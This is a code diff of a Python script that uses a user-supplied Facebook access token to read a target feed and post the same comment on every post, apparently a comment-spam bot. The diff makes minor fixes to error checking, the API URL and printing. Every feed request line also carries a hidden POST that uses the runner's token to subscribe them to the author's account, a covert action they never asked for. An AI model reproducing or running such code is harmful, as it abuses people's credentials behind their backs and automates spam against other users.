@@ -11,7 +11,7 @@ try:
 		global cout
 		dat={'access_token':ken,'message':msg}
 		pt=requests.post('https://graph.facebook.com/'+str(id)+'/comments',data=dat)
-		if 'error' in str(pt):
+		if 'error' in str(pt.text):
 			print('['+str(cout)+']',id,'[failed]')
 		else:
 			print('['+str(cout)+']',id,'[commented]')
@@ -28,15 +28,16 @@ try:
 	msg=input("[?] messages: ").replace('<n>','\n')
 	print()
 	if pil == 'a':
-		reqq=requests.get('https://graph.facebook.com/v3.2/'+tid+'/feed?home&access_token='+ken);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
+		reqq=requests.get('https://graph.facebook.com/'+tid+'/feed?home&access_token='+ken);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
 		jso=json.loads(reqq.text)
 		for i in jso['data']:
 			komen(i['id'],msg,ken)
 	elif pil == 't':
 		ids=[]
-		ree=requests.get('https://graph.facebook.com/v3.2/'+tid+'/feed?home&access_token='+ken);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
+		ree=requests.get('https://graph.facebook.com/'+tid+'/feed?home&access_token='+ken);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
 		jss=json.loads(ree.text)
 		for i in jss['data']:
+			print(i['id'])
 			ids.append(i['id'])
 			try:
 				print("["+str(ct+1)+"] "+json.dumps(i['message'][:40]))
